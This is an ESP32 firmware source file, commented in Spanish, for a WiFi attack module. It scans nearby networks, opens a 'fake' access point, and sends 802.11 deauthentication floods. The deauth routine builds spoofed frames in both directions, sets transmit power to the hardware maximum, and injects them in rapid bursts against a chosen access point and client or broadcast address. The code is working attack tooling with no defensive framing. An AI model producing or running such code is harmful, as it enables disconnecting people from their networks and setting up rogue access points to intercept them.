#include "wifi_module.h"
#include "esp_wifi.h"

WiFiModule WiFiMod;

static const uint8_t DEAUTH_TMPL[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destino (Cliente)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Origen (AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Secuencia
    0x07, 0x00                          // Razón del código (7: Class 3 frame received from nonassociated STA)
};

bool WiFiModule::begin() {
    WiFi.mode(WIFI_MODE_NULL);
    _ready = true;
    return true;
}

void WiFiModule::scan(JsonDocument& result) {
    if (!_ready) {
        result["success"] = false;
        result["error"] = "wifi offline";
        return;
    }

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    int n = WiFi.scanNetworks(false, true);
    JsonArray nets = result["networks"].to<JsonArray>();

    result["success"] = true;
    result["count"] = n;

    for (int i = 0; i < n && i < 30; i++) {
        JsonObject o = nets.add<JsonObject>();
        o["ssid"] = WiFi.SSID(i);
        o["bssid"] = WiFi.BSSIDstr(i);
        o["channel"] = WiFi.channel(i);
        o["rssi"] = WiFi.RSSI(i);
        o["encryption"] = _encStr(WiFi.encryptionType(i));
    }

    WiFi.scanDelete();
    WiFi.mode(WIFI_MODE_NULL);
}

void WiFiModule::deauth(const char* bssidStr, const char* clientStr, int channel, int count) {
    if (!_ready) return;

    uint8_t bssid[6];
    uint8_t client[6];

    _parseMac(bssidStr, bssid);

    bool broadcast = strcmp(clientStr, "FF:FF:FF:FF:FF:FF") == 0 ||
                     strcmp(clientStr, "broadcast") == 0;

    if (broadcast)
        memset(client, 0xFF, 6);
    else
        _parseMac(clientStr, client);

    // 1. FORZAR MÁXIMA ENERGÍA EN LA ANTENA
    if (WiFi.getMode() != WIFI_STA) {
        WiFi.mode(WIFI_STA); 
        delay(20);
    }

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    // 💥 MAXIMIZAR POTENCIA DE TRANSMISIÓN A NIVEL DE HARDWARE (82 = +20.5dBm Máximo absoluto)
    esp_wifi_set_max_tx_power(82); 
    delay(15); 

    uint8_t frame_ap_to_client[26];
    uint8_t frame_client_to_ap[26];

    memcpy(frame_ap_to_client, DEAUTH_TMPL, 26);
    memcpy(frame_ap_to_client + 4, client, 6);   
    memcpy(frame_ap_to_client + 10, bssid, 6);  
    memcpy(frame_ap_to_client + 16, bssid, 6);  

    memcpy(frame_client_to_ap, DEAUTH_TMPL, 26);
    memcpy(frame_client_to_ap + 4, bssid, 6);    
    memcpy(frame_client_to_ap + 10, client, 6);  
    memcpy(frame_client_to_ap + 16, bssid, 6);  

    // 2. INYECCIÓN AGRESIVA SIN RETRASOS DE PROCESAMIENTO
    // Enviamos paquetes en ráfagas acopladas de 4 en 4 antes de ceder tiempo al procesador
    for (int i = 0; i < count; i++) {
        uint16_t seq = (i * 6) & 0xFFF;
        frame_ap_to_client[22] = seq & 0xFF;
        frame_ap_to_client[23] = (seq >> 8) & 0x0F;
        
        frame_client_to_ap[22] = seq & 0xFF;
        frame_client_to_ap[23] = (seq >> 8) & 0x0F;

        // Metralleta de tramas directa al silicio
        esp_wifi_80211_tx(WIFI_IF_STA, frame_ap_to_client, 26, false);
        if (!broadcast) {
            esp_wifi_80211_tx(WIFI_IF_STA, frame_client_to_ap, 26, false);
        }

        // Cada 5 ráfagas dejamos respirar un instante el buffer para evitar que el ESP32 crasheee
        if (i % 5 == 0) {
            delay(1); 
        }
    }
    esp_wifi_set_promiscuous(false);
}

void WiFiModule::startFakeAP(const char* ssid, int channel) {
    if (!_ready) return;
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid, nullptr, channel);
    _fakeAP = true;
}

void WiFiModule::stopFakeAP() {
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_MODE_NULL);
    _fakeAP = false;
}

void WiFiModule::_parseMac(const char* s, uint8_t* mac) {
    sscanf(s, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
}

String WiFiModule::_encStr(wifi_auth_mode_t m) {
    switch (m) {
        case WIFI_AUTH_OPEN:           return "OPEN";
        case WIFI_AUTH_WEP:            return "WEP";
        case WIFI_AUTH_WPA_PSK:        return "WPA";
        case WIFI_AUTH_WPA2_PSK:       return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK:   return "WPA/WPA2";
        case WIFI_AUTH_WPA3_PSK:       return "WPA3";
        default:                       return "UNKNOWN";
    }
}
